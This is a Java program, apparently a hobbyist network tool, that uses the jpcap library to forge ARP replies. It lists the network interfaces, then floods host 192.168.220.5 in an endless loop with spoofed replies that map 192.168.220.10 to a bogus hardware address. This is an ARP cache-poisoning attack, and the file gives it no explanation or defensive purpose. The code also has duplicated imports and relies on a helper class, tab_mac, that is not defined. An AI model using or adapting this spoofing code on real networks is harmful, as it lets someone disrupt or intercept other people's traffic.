import jpcap.JpcapCaptor;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
import jpcap.NetworkInterface;
import jpcap.packet.Packet;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;

public class king

{
      static NetworkInterface [] array ;


public static void main (String[] args)
{
try {
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();

        System.out.println("Opening interface");
for(int i=0;i<devices.length;i++)
{
 System.out.println("devices[i].description              "+devices[i].description );
 System.out.println("devices[i].datalink_description        "+devices[i].datalink_description);
  System.out.println (" devices[i].datalink_name             "+devices[i].datalink_name);
  System.out.println ("          devices[i].name               "+devices[i].name);
 tab_mac.set_mac(devices[i].mac_address);
}
        
      
 int i;
        JpcapCaptor captor=JpcapCaptor.openDevice(devices[0], 2000, false, 3000);
        captor.setFilter("arp", true);
        JpcapSender sender=captor.getJpcapSenderInstance();
 
       
 
 
        byte[] broadcast = new byte[]{(byte)254,(byte)253,(byte)251,(byte)255,(byte)255,(byte)255};
        ARPPacket arp = new ARPPacket();
        arp.hardtype=ARPPacket.HARDTYPE_ETHER;
        arp.prototype=ARPPacket.PROTOTYPE_IP;
        arp.operation=ARPPacket.ARP_REPLY;
        arp.hlen=6;
        arp.plen=4;
        arp.sender_hardaddr=broadcast;
        arp.sender_protoaddr=InetAddress.getByName("192.168.220.10").getAddress();
        arp.target_hardaddr=tab_mac.get_mac_byte("00:0c:29:98:b8:2d");  
        arp.target_protoaddr= InetAddress.getByName("192.168.220.5").getAddress();
 
        EthernetPacket ether = new EthernetPacket();
        ether.frametype=EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac=devices[0].mac_address;
        ether.dst_mac=tab_mac.get_mac_byte("00:0c:29:98:b8:2d");
        arp.datalink=ether;
      String  salah= arp.toString();
        while(true){
        sender.sendPacket(arp);
   System.out.println("arp.getDestinationProtoAddress()>>>>>>>>>>>>>>>"+salah);}
    
}
catch (Exception e) {
        System.out.println("Error: " + e );
    }
}
}

   
    

